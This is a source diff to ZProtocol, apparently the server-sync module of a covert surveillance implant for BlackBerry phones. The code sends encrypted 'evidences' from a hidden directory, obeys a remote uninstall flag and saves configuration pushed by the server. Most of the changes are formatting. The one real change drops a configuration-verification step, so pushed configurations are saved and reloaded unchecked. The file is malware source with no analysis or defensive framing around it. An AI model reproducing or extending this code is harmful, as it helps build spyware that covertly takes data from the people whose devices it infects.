@@ -22,7 +22,6 @@ import blackberry.Status;
 import blackberry.Task;
 import blackberry.action.sync.Protocol;
 import blackberry.action.sync.transport.TransportException;
-import blackberry.config.Conf;
 import blackberry.config.Keys;
 import blackberry.crypto.Encryption;
 import blackberry.crypto.EncryptionPKCS5;
@@ -51,7 +50,7 @@ public class ZProtocol extends Protocol {
 
     boolean upgrade;
     Vector upgradeFiles = new Vector();
-    Status status=Status.getInstance();
+    Status status = Status.getInstance();
 
     public boolean perform() {
         //#ifdef DBC
@@ -78,7 +77,7 @@ public class ZProtocol extends Protocol {
 
             byte[] cypherOut = cryptoConf.encryptData(forgeAuthentication());
             byte[] response = transport.command(cypherOut);
-            Status.self().uninstall=parseAuthentication(response);
+            Status.self().uninstall = parseAuthentication(response);
 
             if (status.uninstall) {
                 //#ifdef DEBUG
@@ -183,7 +182,7 @@ public class ZProtocol extends Protocol {
             //#endif  
 
             sendEvidences(Path.hidden());
-            
+
             //#ifdef DEBUG
             debug.info("***** END *****");
             //#endif  
@@ -282,8 +281,8 @@ public class ZProtocol extends Protocol {
             throw new ProtocolException(14);
         }
 
-        boolean uninstall=false;
-        
+        boolean uninstall = false;
+
         //#ifdef DEBUG
         debug.trace("decodeAuth result = " + Utils.byteArrayToHex(authResult));
         //#endif
@@ -356,7 +355,7 @@ public class ZProtocol extends Protocol {
             //#endif
             throw new ProtocolException(13);
         }
-        
+
         return uninstall;
     }
 
@@ -464,38 +463,48 @@ public class ZProtocol extends Protocol {
     protected int parseNewConf(byte[] result) throws ProtocolException,
             CommandException {
         int res = Utils.byteArrayToInt(result, 0);
+        boolean ret = false;
         if (res == Proto.OK) {
-            //#ifdef DEBUG
-            debug.info("got NewConf");
-            //#endif
 
-            int confLen = Utils.byteArrayToInt(result, 4);
-            //#ifdef DEBUG
-            debug.trace("parseNewConf len: " + confLen);
-            //#endif
-
-            Conf conf = new Conf();            
-            if (conf.verifyConfig(result)) {
-
-                boolean ret = Protocol.saveNewConf(result, 8);
-                if (ret) {
-                    return Proto.OK;
-                }
-            }else{
+            final int confLen = Utils.byteArrayToInt(result, 4);
+            if (confLen > 0) {
                 //#ifdef DEBUG
-                debug.error("parseNewConf: not verified");
+                debug.info("got NewConf");
+                //#endif
+
+                ret = Protocol.saveNewConf(result, 0);
+
+                if (ret) {
+                    //#ifdef DEBUG
+                    debug.info(" (parseNewConf): RELOADING"); //$NON-NLS-1$
+                    //#endif
+                    // status.reload = true;
+                    ret = Task.getInstance().reloadConf();
+                } else {
+                    //#ifdef DEBUG
+                    debug.info(" (parseNewConf): ERROR RELOADING"); //$NON-NLS-1$
+                    //#endif
+                }
+
+            } else {
+                //#ifdef DEBUG
+                debug.info(" Error (parseNewConf): empty conf"); //$NON-NLS-1$
                 //#endif
             }
-            return Proto.ERROR;
+            if (ret) {
+                return Proto.OK;
+            } else {
+                return Proto.ERROR;
+            }
 
         } else if (res == Proto.NO) {
             //#ifdef DEBUG
-            debug.info("no new conf: ");
+            debug.info(" Info: no new conf: "); //$NON-NLS-1$
             //#endif
             return Proto.NO;
         } else {
             //#ifdef DEBUG
-            debug.error("parseNewConf: " + res);
+            debug.info(" Error: parseNewConf: " + res); //$NON-NLS-1$
             //#endif
             throw new ProtocolException();
         }
